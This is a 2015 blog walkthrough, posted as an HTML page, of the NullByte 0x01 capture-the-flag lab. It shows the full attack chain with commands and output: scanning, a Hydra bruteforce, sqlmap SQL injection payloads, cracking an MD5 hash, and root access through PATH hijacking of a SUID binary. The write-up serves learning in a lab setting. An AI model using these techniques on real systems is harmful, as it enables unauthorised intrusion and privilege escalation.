@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>NullByte 0x01 - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-08-21">August 21, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/nullbyte">nullbyte</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">NullByte 0x01</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>NullByte is a hacking challenge created by <a href="https://twitter.com/@ly0nx">ly0n</a>, pitched at a beginner-intermediate level.  The objective is to grab the flag.</p>
+
+<h2 id="port-scan:485cf21adfc47fdddfc7e45f092151aa">Port Scan</h2>
+
+<pre><code class="language-text">root@kali:~# nmap -n -A 192.168.56.102
+
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Null Byte 00 - level 1
+111/tcp open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          53905/udp  status
+|_  100024  1          54255/tcp  status
+777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
+|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
+|_  256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
+</code></pre>
+
+<p>Pop on over in a browser and we see an Eye of Harmony and a little message.  There&rsquo;s nothing else to see, so I did some directory bruteforcing.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/nullbyte0x01/eye.png"  />
+    
+    
+</figure>
+</div>
+
+<pre><code class="language-text">root@kali:~# gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.56.102 -f
+
+=====================================================
+Gobuster v0.8 (DIR support by OJ Reeves @TheColonial)
+              (DNS support by Peleus     @0x42424242)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://192.168.56.102/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307
+[+] Add Slash    : true
+=====================================================
+/uploads/ (200)
+/phpmyadmin/ (200)
+=====================================================
+</code></pre>
+
+<p>I haven&rsquo;t any credentials for phpMyAdmin, so lets take a closer look at the image (main.gif).</p>
+
+<p>Using <code>exiftool</code>, we can see that there is an embeded comment.</p>
+
+<pre><code class="language-text">root@kali:~/Downloads# exiftool main.gif 
+ExifTool Version Number         : 9.74
+File Name                       : main.gif
+Directory                       : .
+File Size                       : 16 kB
+File Modification Date/Time     : 2015:08:21 21:53:41+01:00
+File Access Date/Time           : 2015:08:21 21:53:41+01:00
+File Inode Change Date/Time     : 2015:08:21 21:53:41+01:00
+File Permissions                : rw-r--r--
+File Type                       : GIF
+MIME Type                       : image/gif
+GIF Version                     : 89a
+Image Width                     : 235
+Image Height                    : 302
+Has Color Map                   : No
+Color Resolution Depth          : 8
+Bits Per Pixel                  : 1
+Background Color                : 0
+Comment                         : P-): kzMb5nVYJw
+Image Size                      : 235x302
+</code></pre>
+
+<p><code>kzMb5nVYJw</code> seems to be an interesting string.  After trying various things (passwords etc), it turns out this is a new web directory.</p>
+
+<pre><code class="language-text">root@kali:~# curl http://192.168.56.102/kzMb5nVYJw/
+
+&lt;center&gt;
+&lt;form method=&quot;post&quot; action=&quot;index.php&quot;&gt;
+Key:&lt;br&gt;
+&lt;input type=&quot;password&quot; name=&quot;key&quot;&gt;
+&lt;/form&gt; 
+&lt;/center&gt;
+&lt;!-- this form isn't connected to mysql, password ain't that complex --!&gt;
+</code></pre>
+
+<p>The notion that the password isn&rsquo;t complex implies that we may be able to bruteforce it.  I did this with Hydra - note that it requires both a password and a username be specified.  You can give it a dummy username without supplying it in the actual request.</p>
+
+<pre><code class="language-text">root@kali:~# hydra 192.168.56.102 http-form-post &quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot; -l rasta -P /usr/share/wordlists/metasploit-jtr/password.lst
+[80][http-post-form] host: 192.168.56.102   login: rasta   password: elite
+</code></pre>
+
+<p>After loggin in with the key <code>elite</code>, we see a form where we can search for usernames.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/nullbyte0x01/usrsearch.png"  />
+    
+    
+</figure>
+</div>
+
+<p>Submitting a blank query returns two results.</p>
+
+<pre><code class="language-text">http://192.168.56.102/kzMb5nVYJw/420search.php?usrtosearch=
+
+EMP ID :1
+EMP NAME : ramses
+EMP POSITION :
+--------------------------------
+EMP ID :2
+EMP NAME : isis
+EMP POSITION : employee
+--------------------------------
+Fetched data successfully
+</code></pre>
+
+<h2 id="sqli:485cf21adfc47fdddfc7e45f092151aa">SQLi</h2>
+
+<p>I threw <code>sqlmap</code> at the page, to try injections in the <code>usrtosearch</code> field. Luckily, it returned a few blind-based possible injections.</p>
+
+<pre><code>root@kali:~# sqlmap -u &quot;http://192.168.56.102/kzMb5nVYJw/420search.php?usrtosearch=&quot; --dbms=MySQL
+
+---
+Parameter: usrtosearch (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+    Payload: usrtosearch=&quot; AND 8735=8735#
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)
+    Payload: usrtosearch=&quot; AND (SELECT * FROM (SELECT(SLEEP(5)))pEsD)#
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: usrtosearch=&quot; UNION ALL SELECT NULL,CONCAT(0x7178787071,0x736e4f426852624a4242,0x7178786a71),NULL#
+---
+</code></pre>
+
+<pre><code class="language-text">available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] seth
+</code></pre>
+
+<p>I couldn&rsquo;t find any credentials in the <code>phpmyadmin</code> database, so went on to explore <code>seth</code>.</p>
+
+<pre><code class="language-text">Database: seth
+Table: users
+[2 entries]
++----+---------------------------------------------+--------+------------+
+| id | pass                                        | user   | position   |
++----+---------------------------------------------+--------+------------+
+| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &lt;blank&gt;    |
+| 2  | --not allowed--                             | isis   | employee   |
++----+---------------------------------------------+--------+------------+
+</code></pre>
+
+<p>This password is in the format of base64(md5), but has the terminating <code>=</code> missing.  We can reverse the base64, recover the md5 and crack with <code>john</code>.</p>
+
+<pre><code class="language-text">root@kali:~# echo -en 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=' | base64 -d
+c6d6bd7ebf806f43c76acc3681703b81
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# echo -en 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=' | base64 -d &gt; ramses
+
+root@kali:~# john --format=raw-md5 ramses 
+
+Loaded 1 password hash (Raw-MD5 [MD5 32/32])
+omega            (?)
+</code></pre>
+
+<h2 id="ssh:485cf21adfc47fdddfc7e45f092151aa">SSH</h2>
+
+<p>The credentials <code>ramses:omega</code> can also be used to log in via SSH, remember on port 777.</p>
+
+<pre><code class="language-text">root@kali:~# ssh ramses@192.168.56.102 -p777
+ramses@192.168.56.102's password:
+
+ramses@NullByte:~$ pwd
+/home/ramses
+</code></pre>
+
+<h2 id="procwatch-suid:485cf21adfc47fdddfc7e45f092151aa">procwatch SUID</h2>
+
+<p><code>.bash_history</code> has references to <code>/var/www/backup/procwatch</code>, which turns out to be a SUID binary owned by <code>root</code>.</p>
+
+<pre><code class="language-text">-rwsr-xr-x 1 root root 4932 Aug  2 01:29 procwatch
+</code></pre>
+
+<p>Running the binary seems to produce output from <code>ps</code>.</p>
+
+<pre><code class="language-text">ramses@NullByte:/var/www/backup$ ./procwatch 
+  PID TTY          TIME CMD
+24253 pts/0    00:00:00 procwatch
+24254 pts/0    00:00:00 sh
+24255 pts/0    00:00:00 ps
+</code></pre>
+
+<p>The binary doesn&rsquo;t seem to take any input as arguments, so I used <code>scp</code> to copy it to my Kali box for closer inspection.</p>
+
+<pre><code class="language-text">root@kali:~# scp -P777 ramses@192.168.56.102:/var/www/backup/procwatch .
+ramses@192.168.56.102's password: 
+procwatch                                                                                                                   100% 4932     4.8KB/s   00:00
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# file procwatch 
+procwatch: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=17d666a0c940726b29feedde855535fb21cb160c, not stripped
+
+root@kali:~# gdb -q ./procwatch
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+
+<p>Let&rsquo;s disassemble the main function.</p>
+
+<pre><code class="language-text">gdb-peda$ pdisass main
+
+   0x080483fb &lt;+0&gt;:	lea    ecx,[esp+0x4]
+   0x080483ff &lt;+4&gt;:	and    esp,0xfffffff0
+   0x08048402 &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
+   0x08048405 &lt;+10&gt;:	push   ebp
+   0x08048406 &lt;+11&gt;:	mov    ebp,esp
+   0x08048408 &lt;+13&gt;:	push   ecx
+   0x08048409 &lt;+14&gt;:	sub    esp,0x44
+   0x0804840c &lt;+17&gt;:	lea    eax,[ebp-0x3a]
+   0x0804840f &lt;+20&gt;:	mov    WORD PTR [eax],0x7370
+   0x08048414 &lt;+25&gt;:	mov    BYTE PTR [eax+0x2],0x0
+   0x08048418 &lt;+29&gt;:	sub    esp,0xc
+   0x0804841b &lt;+32&gt;:	lea    eax,[ebp-0x3a]
+   0x0804841e &lt;+35&gt;:	push   eax
+   0x0804841f &lt;+36&gt;:	call   0x80482d0 &lt;system@plt&gt;
+   0x08048424 &lt;+41&gt;:	add    esp,0x10
+   0x08048427 &lt;+44&gt;:	mov    eax,0x0
+   0x0804842c &lt;+49&gt;:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x0804842f &lt;+52&gt;:	leave  
+   0x08048430 &lt;+53&gt;:	lea    esp,[ecx-0x4]
+   0x08048433 &lt;+56&gt;:	ret
+</code></pre>
+
+<p>The call to <code>system()</code> at <code>+36</code> jumps out.  To see what was getting passed to system, I set a breakpoint at <code>0x0804841f</code> and ran the binary.</p>
+
+<pre><code class="language-text">gdb-peda$ b *0x0804841f
+gdb-peda$ r
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xbff92fee --&gt; 0x7370 ('ps')
+EBX: 0xb76ee000 --&gt; 0x1a5da8 
+ECX: 0xbff93040 --&gt; 0x1 
+EDX: 0xbff93064 --&gt; 0xb76ee000 --&gt; 0x1a5da8 
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbff93028 --&gt; 0x0 
+ESP: 0xbff92fd0 --&gt; 0xbff92fee --&gt; 0x7370 ('ps')
+EIP: 0x804841f (&lt;main+36&gt;:	call   0x80482d0 &lt;system@plt&gt;)
+EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048418 &lt;main+29&gt;:	sub    esp,0xc
+   0x804841b &lt;main+32&gt;:	lea    eax,[ebp-0x3a]
+   0x804841e &lt;main+35&gt;:	push   eax
+=&gt; 0x804841f &lt;main+36&gt;:	call   0x80482d0 &lt;system@plt&gt;
+   0x8048424 &lt;main+41&gt;:	add    esp,0x10
+   0x8048427 &lt;main+44&gt;:	mov    eax,0x0
+   0x804842c &lt;main+49&gt;:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x804842f &lt;main+52&gt;:	leave
+Guessed arguments:
+arg[0]: 0xbff92fee --&gt; 0x7370 ('ps')
+arg[1]: 0x0 
+arg[2]: 0xc2 
+arg[3]: 0xb75dc586 (&lt;handle_intel+102&gt;:	test   eax,eax)
+[------------------------------------stack-------------------------------------]
+0000| 0xbff92fd0 --&gt; 0xbff92fee --&gt; 0x7370 ('ps')
+0004| 0xbff92fd4 --&gt; 0x0 
+0008| 0xbff92fd8 --&gt; 0xc2 
+0012| 0xbff92fdc --&gt; 0xb75dc586 (&lt;handle_intel+102&gt;:	test   eax,eax)
+0016| 0xbff92fe0 --&gt; 0xffffffff 
+0020| 0xbff92fe4 --&gt; 0xbff9300e --&gt; 0x10804 
+0024| 0xbff92fe8 --&gt; 0xb7554bf8 --&gt; 0x2aa0 
+0028| 0xbff92fec --&gt; 0x737091e3 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0804841f in main ()
+</code></pre>
+
+<p>Now we can see that the argument being passed to system is <code>ps</code>, critically without an absolute path.  This means all that&rsquo;s required to highjack this binary, is a bit of PATH manipulation.</p>
+
+<pre><code class="language-text">ramses@NullByte:/var/www/backup$ cp /bin/sh ps
+ramses@NullByte:/var/www/backup$ export PATH=/var/www/backup:$PATH
+
+ramses@NullByte:/var/www/backup$ ./procwatch 
+# id
+uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
+# whoami
+root
+</code></pre>
+
+<h2 id="flag:485cf21adfc47fdddfc7e45f092151aa">Flag</h2>
+
+<pre><code class="language-text"># cat /root/proof.txt
+adf11c7a9e6523e630aaf3b9b7acb51d
+
+It seems that you have pwned the box, congrats. 
+Now you done that I wanna talk with you. Write a walk &amp; mail at
+xly0n@sigaint.org attach the walk and proof.txt
+If sigaint.org is down you may mail at nbsly0n@gmail.com
+
+
+USE THIS PGP PUBLIC KEY
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+[...snip...]
+-----END PGP PUBLIC KEY BLOCK-----
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
